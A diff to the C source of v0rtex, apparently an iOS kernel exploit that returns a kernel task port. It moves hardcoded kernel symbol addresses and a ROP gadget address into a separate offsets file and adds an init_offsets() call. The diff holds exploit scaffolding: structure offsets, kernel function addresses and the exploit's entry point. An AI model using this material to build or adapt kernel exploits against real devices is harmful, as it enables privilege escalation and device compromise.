@@ -23,6 +23,7 @@
 #include <CoreFoundation/CoreFoundation.h>
 
 #include "common.h"
+#include "offsets.h"
 
 #define SIZEOF_TASK                                 0x550
 #define OFFSET_TASK_ITK_SELF                        0xd8
@@ -37,20 +38,6 @@
 #define OFFSET_REALHOST_SPECIAL                     0x10
 #define OFFSET_IOUSERCLIENT_IPC                     0x9c
 #define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX     0x5b8
-
-#define OFFSET_ZONE_MAP                             0xfffffff007558478 /* "zone_init: kmem_suballoc failed" */
-#define OFFSET_KERNEL_MAP                           0xfffffff0075b4050
-#define OFFSET_KERNEL_TASK                          0xfffffff0075b4048
-#define OFFSET_REALHOST                             0xfffffff00753aba0 /* host_priv_self */
-#define OFFSET_BZERO                                0xfffffff00708df80
-#define OFFSET_BCOPY                                0xfffffff00708ddc0
-#define OFFSET_COPYIN                               0xfffffff00718d028
-#define OFFSET_COPYOUT                              0xfffffff00718d21c
-#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff0070a60b4 /* convert_task_suspension_token_to_port */
-#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070b938c /* convert_task_suspension_token_to_port */
-#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff0070a5bd8 /* "ipc_host_init" */
-#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006ef2d78
-#define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff00651a174
 
 const uint64_t IOSURFACE_CREATE_SURFACE =  0;
 const uint64_t IOSURFACE_SET_VALUE      =  9;
@@ -281,6 +268,7 @@ typedef union
 
 kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
 {
+	init_offsets();
     kern_return_t retval = KERN_FAILURE,
                   ret;
     task_t self = mach_task_self();
